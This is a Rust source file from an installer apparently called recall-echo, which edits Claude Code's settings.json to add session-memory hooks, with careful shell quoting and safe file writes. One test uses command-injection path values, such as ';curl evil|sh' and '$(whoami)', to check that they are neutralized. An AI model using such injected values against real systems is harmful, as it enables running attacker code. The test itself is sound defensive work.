// This Source Code Form is subject to the terms of the Mozilla Public
// License, v. 2.0. If a copy of the MPL was not distributed with this
// file, You can obtain one at https://mozilla.org/MPL/2.0/.

//! Claude Code's user settings, as `init` edits them.
//!
//! Reading and writing `settings.json`, the three recall-echo hooks inside
//! it, and Claude Code's built-in auto-memory switch. Nothing here prints:
//! every function returns what happened, and `init` reports it. The one
//! guard every Claude Code step goes through, [`claude_code_target`], lives
//! here too, so hooks, the rules file and the auto-memory question skip for
//! the same reasons with the same words.

use std::fs;
use std::io::Write as _;
use std::path::{Path, PathBuf};

use crate::paths;

/// Claude Code's own switch for its built-in auto-memory.
pub(crate) const AUTO_MEMORY_ENV: &str = "CLAUDE_CODE_DISABLE_AUTO_MEMORY";

/// Whether Claude Code's built-in auto-memory is on for this user: it is
/// unless `settings.json` says `"autoMemoryEnabled": false`, or
/// [`AUTO_MEMORY_ENV`] is truthy — in the environment (`env_disable`) or in
/// the settings' own `env` block, which Claude Code applies at startup.
pub(crate) fn auto_memory_on(settings: &serde_json::Value, env_disable: Option<&str>) -> bool {
    fn truthy(value: &str) -> bool {
        matches!(
            value.trim().to_ascii_lowercase().as_str(),
            "1" | "true" | "yes" | "on"
        )
    }
    let setting_off = settings
        .get("autoMemoryEnabled")
        .and_then(serde_json::Value::as_bool)
        == Some(false);
    let settings_env_off = settings
        .get("env")
        .and_then(|env| env.get(AUTO_MEMORY_ENV))
        .and_then(serde_json::Value::as_str)
        .is_some_and(truthy);
    !(setting_off || settings_env_off || env_disable.is_some_and(truthy))
}

/// Turn Claude Code's built-in auto-memory off in `settings`, in memory.
///
/// `settings` is an object — [`open_settings`] refuses anything else.
pub(crate) fn disable_auto_memory(settings: &mut serde_json::Value) {
    settings["autoMemoryEnabled"] = serde_json::Value::Bool(false);
}

// ── Which Claude Code install a run configures ───────────────────────────

/// Why a Claude Code step does not run.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum Skip {
    /// There is no Claude Code install to configure.
    NoClaudeCode,
    /// A binary under `target/debug` or `target/release` is a test harness
    /// or a working copy, not something a user's config should point at.
    BuildDir,
    /// A pulse-null pulse: pulse-null writes this pulse's own Claude Code
    /// rules and puts its MEMORY.md into the pulse's prompt itself.
    PulseRoot,
    /// The user these settings belong to runs pulses (the listed pulse
    /// directories). User-level rules would load into every one of their
    /// sessions, on top of the MEMORY.md pulse-null already gives them, and
    /// user-level hooks would fire for every pulse and resolve to the wrong
    /// store — pulse-null gives each pulse its own.
    PulseHome(Vec<PathBuf>),
}

impl std::fmt::Display for Skip {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Skip::NoClaudeCode => f.write_str("Claude Code is not installed"),
            Skip::BuildDir => f.write_str("running from a build directory"),
            Skip::PulseRoot => f.write_str(
                "this is a pulse-null pulse, and pulse-null writes its rules and loads its \
                 MEMORY.md itself",
            ),
            Skip::PulseHome(pulses) => {
                let names: Vec<String> = pulses.iter().map(|p| p.display().to_string()).collect();
                write!(
                    f,
                    "this user runs pulse-null pulses ({}); user-level hooks and rules would \
                     fire in every pulse session, and pulse-null gives each pulse its own",
                    names.join(", ")
                )
            }
        }
    }
}

/// The Claude Code install a run configures.
pub(crate) struct ClaudeTarget {
    claude_dir: PathBuf,
    /// Set when the memory steps — the rules file and the auto-memory
    /// question — must not run here, although hooks still do.
    memory_skip: Option<Skip>,
}

impl ClaudeTarget {
    pub(crate) fn claude_dir(&self) -> &Path {
        &self.claude_dir
    }

    pub(crate) fn settings_path(&self) -> PathBuf {
        self.claude_dir.join("settings.json")
    }

    /// `Err` with the reason when the rules file and the auto-memory
    /// question must not run for this root.
    pub(crate) fn memory_steps(&self) -> Result<(), &Skip> {
        self.memory_skip.as_ref().map_or(Ok(()), Err)
    }
}

/// Whether `root` is a pulse-null pulse.
fn is_pulse_root(root: &Path) -> bool {
    root.join("pulse-null.toml").is_file()
}

/// The pulses under `home`, everywhere pulse-null looks for them: the flat
/// `~/pulse-null/<name>`, the containers `~/pulse-null/pulses/<name>` and
/// (before PN-115) `~/pulse-null/entities/<name>`, and the legacy
/// `~/entity`. A pulse is a real directory — not a symlink — holding
/// `pulse-null.toml`, as pulse-null's own discovery judges it. Sorted, so
/// messages are stable.
fn pulses_in(home: &Path) -> Vec<PathBuf> {
    let install = home.join("pulse-null");
    let mut pulses: Vec<PathBuf> = [
        install.clone(),
        install.join("pulses"),
        install.join("entities"),
    ]
    .iter()
    .filter_map(|dir| fs::read_dir(dir).ok())
    .flat_map(|entries| entries.filter_map(Result::ok))
    .filter(|entry| entry.file_type().is_ok_and(|t| t.is_dir()))
    .map(|entry| entry.path())
    .filter(|dir| is_pulse_root(dir))
    .collect();
    let legacy = home.join("entity");
    if fs::symlink_metadata(&legacy).is_ok_and(|meta| meta.is_dir()) && is_pulse_root(&legacy) {
        pulses.push(legacy);
    }
    pulses.sort();
    pulses.dedup();
    pulses
}

/// Whether `a` and `b` name the same directory.
fn same_dir(a: &Path, b: &Path) -> bool {
    match (fs::canonicalize(a), fs::canonicalize(b)) {
        (Ok(a), Ok(b)) => a == b,
        _ => a == b,
    }
}

/// The one guard every Claude Code step goes through: hooks, the rules file
/// and the auto-memory question.
///
/// `Err` skips all three — including when the user runs pulses and the
/// target is their own `~/.claude`, where hooks would fire for every pulse.
/// A target whose [`ClaudeTarget::memory_steps`] is `Err` still gets hooks.
pub(crate) fn claude_code_target(
    roots: &paths::ConfigRoots,
    pulse_root: &Path,
) -> Result<ClaudeTarget, Skip> {
    let claude_dir = roots.claude_dir().ok_or(Skip::NoClaudeCode)?;
    if paths::is_build_dir(roots.recall_bin()) {
        return Err(Skip::BuildDir);
    }
    let home = roots.home();
    let pulses = home.as_deref().map(pulses_in).unwrap_or_default();
    let user_level = home
        .as_deref()
        .is_some_and(|home| same_dir(&home.join(".claude"), claude_dir));
    if !pulses.is_empty() && user_level {
        return Err(Skip::PulseHome(pulses));
    }
    let memory_skip = if is_pulse_root(pulse_root) {
        Some(Skip::PulseRoot)
    } else {
        (!pulses.is_empty()).then_some(Skip::PulseHome(pulses))
    };
    Ok(ClaudeTarget {
        claude_dir: claude_dir.to_path_buf(),
        memory_skip,
    })
}

// ── settings.json ────────────────────────────────────────────────────────

/// Parse settings.json as it was read: `None` (no file) is a fresh `{}`.
///
/// Unparseable, or not an object, means the user's existing configuration —
/// falling back to `{}` there would overwrite everything they have
/// (permissions, MCP servers, env) with a file holding nothing but our
/// change. The `Err` names why.
fn parse_settings(path: &Path, bytes: Option<&[u8]>) -> Result<serde_json::Value, String> {
    let Some(bytes) = bytes else {
        return Ok(serde_json::json!({}));
    };
    let settings: serde_json::Value = serde_json::from_slice(bytes).map_err(|e| {
        format!(
            "{} is not valid JSON ({e}) — refusing to overwrite it; fix the file and re-run init",
            path.display()
        )
    })?;
    if !settings.is_object() {
        return Err(format!(
            "{} is not a JSON object — refusing to overwrite it",
            path.display()
        ));
    }
    Ok(settings)
}

/// The file's bytes, or `None` when there is no file.
fn read_bytes(path: &Path) -> Result<Option<Vec<u8>>, String> {
    match fs::read(path) {
        Ok(bytes) => Ok(Some(bytes)),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(None),
        Err(e) => Err(format!("Could not read {} ({e})", path.display())),
    }
}

/// One `init`'s edit of settings.json: read once, changed in memory by every
/// step, written once (#75 audit B2).
pub(crate) struct SettingsEdit {
    path: PathBuf,
    /// The bytes as they were read; `None` when there was no file.
    original: Option<Vec<u8>>,
    /// The settings, with this run's changes applied so far.
    pub(crate) value: serde_json::Value,
}

/// What [`open_settings`] found.
pub(crate) enum OpenSettings {
    Edit(SettingsEdit),
    /// settings.json is a symlink — a dotfiles setup's, never replaced.
    Symlink,
    /// Unreadable, or not a JSON object: never overwritten. The reason.
    Refused(String),
}

/// How [`SettingsEdit::commit`] wrote.
#[derive(Debug, PartialEq, Eq)]
pub(crate) enum Committed {
    /// Over the file exactly as it was read.
    Written,
    /// The file changed while `init` ran (an editor, during a prompt): its
    /// new content was kept and this run's changes applied to it again.
    WrittenOverChange,
}

pub(crate) fn open_settings(path: &Path) -> OpenSettings {
    if fs::symlink_metadata(path).is_ok_and(|meta| meta.file_type().is_symlink()) {
        return OpenSettings::Symlink;
    }
    let original = match read_bytes(path) {
        Ok(original) => original,
        Err(why) => return OpenSettings::Refused(why),
    };
    match parse_settings(path, original.as_deref()) {
        Ok(value) => OpenSettings::Edit(SettingsEdit {
            path: path.to_path_buf(),
            original,
            value,
        }),
        Err(why) => OpenSettings::Refused(why),
    }
}

impl SettingsEdit {
    /// Write the edited settings — once.
    ///
    /// The file is read again first. When it changed since [`open_settings`],
    /// the new content wins and `reapply` makes this run's changes to it
    /// again; when the new content is no longer a JSON object, nothing is
    /// written. The bytes being replaced are kept as `settings.json.bak`, and
    /// the replacement keeps the file's permissions — it can hold permission
    /// allowlists and credentials, so its mode is not ours to loosen.
    pub(crate) fn commit(
        self,
        reapply: impl FnOnce(&mut serde_json::Value) -> Result<(), String>,
    ) -> Result<Committed, String> {
        // Again here, not only in `open_settings`: it may have become a
        // symlink while a prompt was waiting, and a symlink is never replaced.
        if fs::symlink_metadata(&self.path).is_ok_and(|meta| meta.file_type().is_symlink()) {
            return Err(format!(
                "{} became a symlink while init was running — not replaced; this run's \
                 changes were not written",
                self.path.display()
            ));
        }
        let current = read_bytes(&self.path)?;
        let (value, committed) = if current == self.original {
            (self.value, Committed::Written)
        } else {
            let mut fresh = parse_settings(&self.path, current.as_deref()).map_err(|why| {
                format!("{why} (it changed while init was running) — this run's changes were not written")
            })?;
            reapply(&mut fresh)?;
            (fresh, Committed::WrittenOverChange)
        };
        let content = serde_json::to_string_pretty(&value)
            .map_err(|e| format!("Failed to serialize settings: {e}"))?;
        if let Some(replaced) = &current {
            // Through the same writer: owner-only, created exclusively, and a
            // symlink at the `.bak` path is replaced, never written through.
            atomic_replace(&self.path.with_extension("json.bak"), replaced, false).map_err(
                |e| {
                    format!(
                        "Could not keep a backup of {} ({e}) — not written",
                        self.path.display()
                    )
                },
            )?;
        }
        atomic_replace(&self.path, &content, true)
            .map_err(|e| format!("Failed to write {}: {e}", self.path.display()))?;
        Ok(committed)
    }
}

/// What [`apply_hooks`] did to a settings value.
pub(crate) struct HookChange {
    /// Whether the value now differs and must be written.
    pub changed: bool,
    /// Every rewrite, removal or customized hook left alone, one line each.
    pub notes: Vec<String>,
}

/// Install or repair the three recall-echo hooks in `settings`, in memory.
///
/// Split from the file I/O so the edit can be exercised on a value with a
/// named binary: where anything is written is the caller's business, never
/// a path this process resolves for itself (#59). `Err` is the refusal, for
/// the status line.
pub(crate) fn apply_hooks(
    settings: &mut serde_json::Value,
    pulse_root: &Path,
    recall_bin: &str,
) -> Result<HookChange, String> {
    let root = fs::canonicalize(pulse_root).unwrap_or_else(|_| pulse_root.to_path_buf());
    // A control character (a newline especially) inside a shell command line
    // is unrecoverable for the user reading settings.json later.
    if root.display().to_string().chars().any(char::is_control) {
        return Err(
            "Pulse root contains control characters — refusing to write it into a shell hook"
                .to_string(),
        );
    }

    // The binary path is interpolated bare (the matcher recognizes hooks by
    // literal shape, so it cannot be quoted). A replaced-in-place binary or a
    // path outside the conservative install-path alphabet is refused rather
    // than baked into a broken or dangerous command line.
    if recall_bin.ends_with(" (deleted)") {
        return Err(
            "The running binary was replaced on disk during init — re-run init".to_string(),
        );
    }
    if !is_shell_safe_bin(recall_bin) {
        return Err(format!(
            "Refusing to write hooks: binary path {recall_bin} contains characters unsafe \
             in a shell command — install recall-echo at a plain path and re-run init"
        ));
    }

    let mut notes: Vec<String> = Vec::new();
    let changed = upsert_recall_hooks(settings, recall_bin, &root, &mut notes)
        .map_err(|why| format!("settings.json: {why} — hooks not configured"))?;
    Ok(HookChange { changed, notes })
}

/// Replace `path` with `content` without a window where Claude Code could
/// read it half-written, find it absent, or anyone else could read it.
///
/// The temp file sits beside `path`, pid-suffixed so concurrent inits cannot
/// rename each other's temp into place, is created exclusively (`O_EXCL`)
/// and owner-only from birth — creating at the umask default and tightening
/// later leaves a world-readable window — and is synced before the rename.
/// `keep_mode` copies the existing file's permissions onto the replacement,
/// for a file whose mode is the user's choice rather than ours.
pub(crate) fn atomic_replace(
    path: &Path,
    content: impl AsRef<[u8]>,
    keep_mode: bool,
) -> std::io::Result<()> {
    use std::os::unix::fs::OpenOptionsExt;

    let mut name = path.file_name().unwrap_or_default().to_os_string();
    name.push(format!(".tmp.{}", std::process::id()));
    let tmp = path.with_file_name(name);
    let _ = fs::remove_file(&tmp);
    let written = (|| {
        let mut f = fs::OpenOptions::new()
            .write(true)
            .create_new(true)
            .mode(0o600)
            .open(&tmp)?;
        f.write_all(content.as_ref())?;
        f.sync_all()?;
        if keep_mode {
            if let Ok(meta) = fs::metadata(path) {
                fs::set_permissions(&tmp, meta.permissions())?;
            }
        }
        fs::rename(&tmp, path)
    })();
    if written.is_err() {
        let _ = fs::remove_file(&tmp);
    }
    written
}

/// Quote a path for use inside a shell hook command line.
///
/// Always single-quoted: POSIX single quotes disable every expansion — `$`,
/// backticks, `;`, `|`, spaces — and an embedded `'` is closed, escaped, and
/// reopened. Quoting only "when needed" is how metacharacters slip through.
fn shell_path(path: &Path) -> String {
    format!("'{}'", path.display().to_string().replace('\'', r"'\''"))
}

/// Whether a binary path is safe to interpolate bare into a hook command.
///
/// The binary path is the one interpolated value that cannot be quoted: the
/// existing-hook matcher recognizes our commands by their literal shape, and
/// quoting would change it. Unlike the pulse root — arbitrary user data —
/// an install path is conventional, so a conservative character set covers
/// every real install and anything outside it is refused with a message
/// rather than baked into a broken or dangerous command line.
fn is_shell_safe_bin(path: &str) -> bool {
    !path.is_empty()
        && path
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "/._+-".contains(c))
}

/// Shell operators (scanned outside single-quoted spans) whose presence marks
/// a hook command as hand-customized.
///
/// The canonical commands this installer writes contain none of these outside
/// quotes, so a recall-echo hook that does — `recall-echo archive-session ||
/// true`, a chained cleanup, a redirect — was shaped by the user on purpose,
/// and rewriting it would silently destroy that intent. Prefix wrappers
/// (`timeout`, `nice`, `env`) carry no operator at all; those are caught by
/// the canonical-shape check in [`is_bare_recall_invocation`] instead.
const SHELL_OPERATORS: [&str; 8] = [";", "&", "|", ">", "<", "$", "`", "\n"];

/// The command text with single-quoted spans removed — the only part where a
/// shell operator means anything. The pulse root recall-echo itself quotes
/// may legally contain `;` or `$`; scanning through the quotes would make our
/// own canonical hooks look customized and permanently unrepairable.
fn strip_single_quoted(cmd: &str) -> String {
    let mut out = String::new();
    let mut in_quote = false;
    for c in cmd.chars() {
        match c {
            '\'' => in_quote = !in_quote,
            _ if in_quote => {}
            _ => out.push(c),
        }
    }
    out
}

/// Whether a hook command is a plain recall-echo invocation this installer
/// may rewrite: the first token is a recall-echo binary, the second is the
/// expected subcommand, and no shell operator appears outside quotes.
/// Anything else — a `timeout`/`nice`/`env` wrapper, a `|| true` guard, a
/// chained command — is user configuration.
fn is_bare_recall_invocation(cmd: &str, subcommand: &str) -> bool {
    if SHELL_OPERATORS
        .iter()
        .any(|op| strip_single_quoted(cmd).contains(op))
    {
        return false;
    }
    let mut parts = cmd.split_whitespace();
    let Some(first) = parts.next() else {
        return false;
    };
    Path::new(first)
        .file_name()
        .is_some_and(|f| f == "recall-echo")
        && parts.next() == Some(subcommand)
}

/// The sources the SessionStart `consume` hook fires on.
const SESSION_START_MATCHER: &str = "startup|resume|clear";

/// Install or repair the three recall-echo hooks in a settings.json value.
///
/// The pulse root is baked into every command: hooks run with the harness's
/// cwd, which is wherever the user happens to be working, and a bare
/// `recall-echo archive-session` resolves against that — capture then only
/// works when the shell sits in the pulse root. MCP registration already
/// bakes the root for reads; this is the write-side counterpart.
///
/// A plain recall-echo hook whose command differs from the expected line —
/// the bare pre-4.2 form, a stale root — is rewritten in place and reported,
/// so re-running `init` repairs a broken install instead of declaring it
/// present. Duplicate recall-echo hooks are collapsed to one — a repaired
/// duplicate would archive every session twice at double the extraction
/// bill. Two kinds of hooks are never rewritten: ones that are not
/// recall-echo's at all, and customized invocations (wrappers, guards,
/// chains — see [`is_bare_recall_invocation`]), each reported through
/// `notes` with the canonical command so the user can migrate it by hand.
///
/// Returns `Ok(changed)`, or `Err` naming what in the settings shape made
/// the install unsafe to attempt.
fn upsert_recall_hooks(
    settings: &mut serde_json::Value,
    recall_bin: &str,
    pulse_root: &Path,
    notes: &mut Vec<String>,
) -> Result<bool, String> {
    let root = shell_path(pulse_root);
    // SessionStart injects EPHEMERAL.md into context via stdout on startup,
    // resume and `/clear` — a cleared session still wants to know what came
    // before it (#75). Skips `compact`: the conversation continues, nothing
    // prior to surface. `consume` takes the root positionally.
    let plan: [(&str, Option<&str>, &str, String); 3] = [
        (
            "SessionStart",
            Some(SESSION_START_MATCHER),
            "consume",
            format!("{recall_bin} consume {root}"),
        ),
        (
            "SessionEnd",
            None,
            "archive-session",
            format!("{recall_bin} archive-session --pulse-root {root}"),
        ),
        (
            "PreCompact",
            None,
            "checkpoint",
            format!("{recall_bin} checkpoint --trigger precompact --pulse-root {root}"),
        ),
    ];

    let hooks = settings
        .as_object_mut()
        .and_then(|o| {
            o.entry("hooks")
                .or_insert_with(|| serde_json::json!({}))
                .as_object_mut()
        })
        .ok_or_else(|| "settings.json root is not a JSON object".to_string())?;

    let mut changed = false;
    for (event, matcher, subcommand, expected) in plan {
        if upsert_hook(hooks, event, matcher, subcommand, &expected, notes)? {
            changed = true;
        }
    }
    Ok(changed)
}

/// The flag hooks written before 4.6.0 carried the pulse root under.
const LEGACY_ROOT_FLAG: &str = "--entity-root";

/// What rewriting a plain recall-echo hook to the canonical command did, in
/// the words the user needs: a rename of the pre-4.6.0 flag, or a root the
/// hook did not carry (or carried stale).
fn rewrite_note(event: &str, previous: &str) -> String {
    if previous.contains(LEGACY_ROOT_FLAG) {
        format!("{event}: renamed {LEGACY_ROOT_FLAG} to --pulse-root in the recall-echo hook")
    } else {
        format!("{event}: updated recall-echo hook to carry the pulse root")
    }
}

/// Ensure one event carries exactly one canonical recall-echo hook command.
///
/// Every recall-echo hook under the event is considered: the first canonical
/// (or repairable-and-repaired) occurrence stands, further duplicates are
/// removed, customized invocations are reported and left alone. A group
/// whose hooks are all exactly ours also gets its matcher synced. When no
/// recall-echo hook exists at all, a new group is appended.
///
/// Returns `Ok(changed)`, or `Err` when the event's value is not an array —
/// someone else's structure, not ours to repair or append to.
fn upsert_hook(
    hooks: &mut serde_json::Map<String, serde_json::Value>,
    event: &str,
    matcher: Option<&str>,
    subcommand: &str,
    expected: &str,
    notes: &mut Vec<String>,
) -> Result<bool, String> {
    // Recognize ours by the base command name, not the full binary path.
    let marker = format!("recall-echo {subcommand}");
    let not_array = || format!("\"hooks\".\"{event}\" is not an array — fix it and re-run init");

    let mut changed = false;
    let mut found = false;
    let mut have_canonical = false;

    if let Some(value) = hooks.get_mut(event) {
        let arr = value.as_array_mut().ok_or_else(not_array)?;
        for group in arr.iter_mut() {
            let Some(inner) = group.get_mut("hooks").and_then(|h| h.as_array_mut()) else {
                continue;
            };
            let mut i = 0;
            while i < inner.len() {
                let Some(cmd) = inner[i]
                    .get("command")
                    .and_then(|c| c.as_str())
                    .map(String::from)
                else {
                    i += 1;
                    continue;
                };
                if !cmd.contains(&marker) {
                    i += 1;
                    continue;
                }
                found = true;
                let repairable = cmd == expected || is_bare_recall_invocation(&cmd, subcommand);
                if repairable && have_canonical {
                    inner.remove(i);
                    notes.push(format!("{event}: removed a duplicate recall-echo hook"));
                    changed = true;
                    continue; // index now points at the next element
                }
                if cmd == expected {
                    have_canonical = true;
                } else if repairable {
                    inner[i]["command"] = serde_json::Value::String(expected.to_string());
                    notes.push(rewrite_note(event, &cmd));
                    have_canonical = true;
                    changed = true;
                } else {
                    notes.push(format!(
                        "{event}: left a customized recall-echo hook unchanged: {cmd} — note it \
                         does not carry the pulse root; the canonical command is: {expected}"
                    ));
                }
                i += 1;
            }
            // Sync the matcher only when every hook in the group is exactly
            // ours — a shared group's matcher governs foreign hooks too.
            let all_ours = !inner.is_empty()
                && inner
                    .iter()
                    .all(|h| h.get("command").and_then(|c| c.as_str()) == Some(expected));
            if all_ours {
                if let Some(m) = matcher {
                    if group.get("matcher").and_then(|v| v.as_str()) != Some(m) {
                        group["matcher"] = serde_json::Value::String(m.to_string());
                        changed = true;
                    }
                }
            }
        }
        // A dedup pass can leave a group with no hooks; an empty group is
        // noise the harness still iterates.
        arr.retain(|group| {
            group
                .get("hooks")
                .and_then(|h| h.as_array())
                .is_none_or(|inner| !inner.is_empty())
        });
    }

    if found {
        return Ok(changed);
    }

    let arr = hooks
        .entry(event)
        .or_insert_with(|| serde_json::json!([]))
        .as_array_mut()
        .ok_or_else(not_array)?;
    let mut group = serde_json::json!({
        "hooks": [{"type": "command", "command": expected}]
    });
    if let Some(m) = matcher {
        group["matcher"] = serde_json::Value::String(m.to_string());
    }
    arr.push(group);
    Ok(true)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn upsert(settings: &mut serde_json::Value, root: &str) -> (bool, Vec<String>) {
        let mut skipped = Vec::new();
        let changed = upsert_recall_hooks(
            settings,
            "/usr/local/bin/recall-echo",
            Path::new(root),
            &mut skipped,
        )
        .unwrap();
        (changed, skipped)
    }

    #[test]
    fn hooks_carry_the_pulse_root() {
        let mut settings = serde_json::json!({});
        let (changed, skipped) = upsert(&mut settings, "/home/d/.wiseferry");
        assert!(changed);
        assert!(skipped.is_empty());

        let text = settings.to_string();
        assert!(text.contains("archive-session --pulse-root '/home/d/.wiseferry'"));
        assert!(text.contains("checkpoint --trigger precompact --pulse-root '/home/d/.wiseferry'"));
        assert!(text.contains("consume '/home/d/.wiseferry'"));
    }

    /// The pre-4.2 bare hook is exactly what left capture broken outside the
    /// pulse root. A re-run of `init` must repair it, not declare it present.
    #[test]
    fn a_legacy_bare_hook_is_rewritten_not_skipped() {
        let mut settings = serde_json::json!({
            "hooks": {
                "SessionStart": [{
                    "matcher": "startup|resume",
                    "hooks": [{"type": "command", "command": "/usr/local/bin/recall-echo consume"}]
                }],
                "SessionEnd": [{
                    "hooks": [{"type": "command", "command": "/usr/local/bin/recall-echo archive-session"}]
                }],
                "PreCompact": [{
                    "hooks": [{"type": "command", "command": "/usr/local/bin/recall-echo checkpoint --trigger precompact"}]
                }]
            }
        });
        let (changed, notes) = upsert(&mut settings, "/home/d/.wiseferry");
        assert!(changed);
        // Every rewrite is reported — a silent replacement of a command the
        // user may have edited is how trust in the installer dies.
        assert_eq!(notes.len(), 3, "{notes:?}");
        assert!(notes.iter().all(|n| n.contains("updated")), "{notes:?}");

        let text = settings.to_string();
        assert!(text.contains("archive-session --pulse-root '/home/d/.wiseferry'"));
        // Rewritten in place, not duplicated alongside the bare form.
        assert_eq!(text.matches("archive-session").count(), 1);
        assert_eq!(text.matches("checkpoint").count(), 1);
        assert_eq!(text.matches("consume").count(), 1);
    }

    /// The canonical 4.2–4.5 hooks spell the root flag `--entity-root`.
    /// Re-running `init` renames it in place, and a second run finds nothing
    /// left to do.
    #[test]
    fn a_pre_4_6_entity_root_hook_is_rewritten_to_pulse_root() {
        let mut settings = serde_json::json!({
            "hooks": {
                "SessionStart": [{
                    "matcher": "startup|resume",
                    "hooks": [{"type": "command", "command": "/usr/local/bin/recall-echo consume '/home/d/.wiseferry'"}]
                }],
                "SessionEnd": [{
                    "hooks": [{"type": "command", "command": "/usr/local/bin/recall-echo archive-session --entity-root '/home/d/.wiseferry'"}]
                }],
                "PreCompact": [{
                    "hooks": [{"type": "command", "command": "/usr/local/bin/recall-echo checkpoint --trigger precompact --entity-root '/home/d/.wiseferry'"}]
                }]
            }
        });
        let (changed, notes) = upsert(&mut settings, "/home/d/.wiseferry");
        assert!(changed);
        assert_eq!(
            notes.len(),
            2,
            "consume takes the root positionally: {notes:?}"
        );
        assert!(
            notes
                .iter()
                .all(|n| n.contains("renamed --entity-root to --pulse-root")),
            "{notes:?}"
        );

        let text = settings.to_string();
        assert!(!text.contains("--entity-root"), "{text}");
        assert!(text.contains("archive-session --pulse-root '/home/d/.wiseferry'"));
        assert!(text.contains("checkpoint --trigger precompact --pulse-root '/home/d/.wiseferry'"));
        assert_eq!(text.matches("archive-session").count(), 1);
        assert_eq!(text.matches("checkpoint").count(), 1);

        let after_first = settings.clone();
        let (changed_again, notes_again) = upsert(&mut settings, "/home/d/.wiseferry");
        assert!(!changed_again, "{notes_again:?}");
        assert_eq!(settings, after_first);
    }

    /// A guarded hook still spelling `--entity-root` is the user's; it keeps
    /// working through the flag alias, and is reported rather than rewritten.
    #[test]
    fn a_guarded_entity_root_hook_is_left_to_the_alias() {
        let guarded =
            "/usr/local/bin/recall-echo archive-session --entity-root '/home/d/pulse' || true";
        let mut settings = serde_json::json!({
            "hooks": {
                "SessionEnd": [{"hooks": [{"type": "command", "command": guarded}]}]
            }
        });
        let (_, notes) = upsert(&mut settings, "/home/d/pulse");
        assert!(settings.to_string().contains(guarded));
        assert_eq!(notes.len(), 1, "{notes:?}");
        assert!(notes[0].contains("left a customized"), "{notes:?}");
    }

    #[test]
    fn a_correct_hook_set_is_left_unchanged() {
        let mut settings = serde_json::json!({});
        upsert(&mut settings, "/home/d/.wiseferry");

        let before = settings.clone();
        let (changed, _) = upsert(&mut settings, "/home/d/.wiseferry");
        assert!(!changed);
        assert_eq!(settings, before);
    }

    fn session_start_matchers(settings: &serde_json::Value) -> Vec<String> {
        settings["hooks"]["SessionStart"]
            .as_array()
            .unwrap()
            .iter()
            .map(|group| group["matcher"].as_str().unwrap_or_default().to_string())
            .collect()
    }

    /// A cleared session still gets EPHEMERAL.md (#75).
    #[test]
    fn init_session_start_matcher_includes_clear() {
        let mut settings = serde_json::json!({});
        upsert(&mut settings, "/home/d/.wiseferry");
        assert_eq!(session_start_matchers(&settings), ["startup|resume|clear"]);
    }

    /// A 4.6 install's recall-echo-only group is upgraded on re-init.
    #[test]
    fn init_upgrades_recall_only_startup_resume_group() {
        let mut settings = serde_json::json!({});
        upsert(&mut settings, "/home/d/.wiseferry");
        settings["hooks"]["SessionStart"][0]["matcher"] = "startup|resume".into();

        let (changed, _) = upsert(&mut settings, "/home/d/.wiseferry");
        assert!(changed);
        assert_eq!(session_start_matchers(&settings), ["startup|resume|clear"]);
    }

    /// A group shared with someone else's hook keeps its matcher: it governs
    /// their hook too.
    #[test]
    fn init_keeps_shared_group_matcher() {
        let mut settings = serde_json::json!({});
        upsert(&mut settings, "/home/d/.wiseferry");
        let ours = settings["hooks"]["SessionStart"][0]["hooks"][0].clone();
        settings["hooks"]["SessionStart"] = serde_json::json!([{
            "matcher": "startup",
            "hooks": [ours, {"type": "command", "command": "notify-send hello"}]
        }]);

        let (changed, _) = upsert(&mut settings, "/home/d/.wiseferry");
        assert!(!changed);
        assert_eq!(session_start_matchers(&settings), ["startup"]);
    }

    #[test]
    fn foreign_hooks_are_never_touched() {
        let mut settings = serde_json::json!({
            "hooks": {
                "SessionEnd": [{
                    "hooks": [{"type": "command", "command": "notify-send done"}]
                }]
            }
        });
        upsert(&mut settings, "/home/d/.wiseferry");

        let text = settings.to_string();
        assert!(text.contains("notify-send done"));
        assert!(text.contains("archive-session --pulse-root '/home/d/.wiseferry'"));
    }

    /// A recall-echo hook the user wrapped or guarded — the `|| true`
    /// SessionEnd guard pulse-null depends on, a `timeout` prefix, a chained
    /// cleanup — is deliberate configuration. Repairing it would break it;
    /// it must be reported and left alone, and not duplicated either.
    #[test]
    fn a_wrapped_recall_hook_is_reported_not_rewritten() {
        let mut settings = serde_json::json!({
            "hooks": {
                "SessionEnd": [{
                    "hooks": [{"type": "command", "command": "/usr/local/bin/recall-echo archive-session || true"}]
                }]
            }
        });
        let (_, skipped) = upsert(&mut settings, "/home/d/.wiseferry");
        assert_eq!(skipped.len(), 1);
        assert!(
            skipped[0].contains("archive-session || true"),
            "{skipped:?}"
        );

        let text = settings.to_string();
        assert!(text.contains("archive-session || true"));
        // Not duplicated with a canonical form alongside it.
        assert_eq!(text.matches("archive-session").count(), 1);
    }

    /// Quoting is unconditional and single-quoted: `$`, backticks, `;`, `"`
    /// and spaces must all reach the shell as literal path bytes.
    #[test]
    fn a_root_with_shell_metacharacters_is_neutralized() {
        for (root, quoted) in [
            (
                "/Users/d/My Files/.wiseferry",
                "'/Users/d/My Files/.wiseferry'",
            ),
            ("/tmp/x;curl evil|sh", "'/tmp/x;curl evil|sh'"),
            ("/tmp/$(whoami)/`id`", "'/tmp/$(whoami)/`id`'"),
        ] {
            let mut settings = serde_json::json!({});
            upsert(&mut settings, root);
            let text = settings.to_string();
            // None of these roots contain characters JSON escapes, so a
            // plain substring check sees exactly what the shell will.
            assert!(
                text.contains(&format!("--pulse-root {quoted}")),
                "{root}: {text}"
            );
        }
    }

    /// An embedded single quote is the one byte single-quoting cannot pass
    /// through directly — it must be closed, escaped, reopened.
    #[test]
    fn an_embedded_single_quote_is_escaped() {
        assert_eq!(
            shell_path(Path::new("/home/d/o'brien")),
            r"'/home/d/o'\''brien'"
        );
    }

    /// Two stale hooks under one event — a binary-path change under the old
    /// installer could leave both — must both be repaired in one pass, not
    /// first-one-wins with the duplicate left permanently unreachable.
    #[test]
    fn duplicate_stale_hooks_collapse_to_one() {
        let mut settings = serde_json::json!({
            "hooks": {
                "SessionEnd": [
                    {"hooks": [{"type": "command", "command": "/old/path/recall-echo archive-session"}]},
                    {"hooks": [{"type": "command", "command": "/usr/local/bin/recall-echo archive-session"}]}
                ]
            }
        });
        let (changed, notes) = upsert(&mut settings, "/home/d/.wiseferry");
        assert!(changed);
        // Repairing both would turn a dead duplicate into a live one that
        // archives every session twice at double the extraction bill.
        assert!(
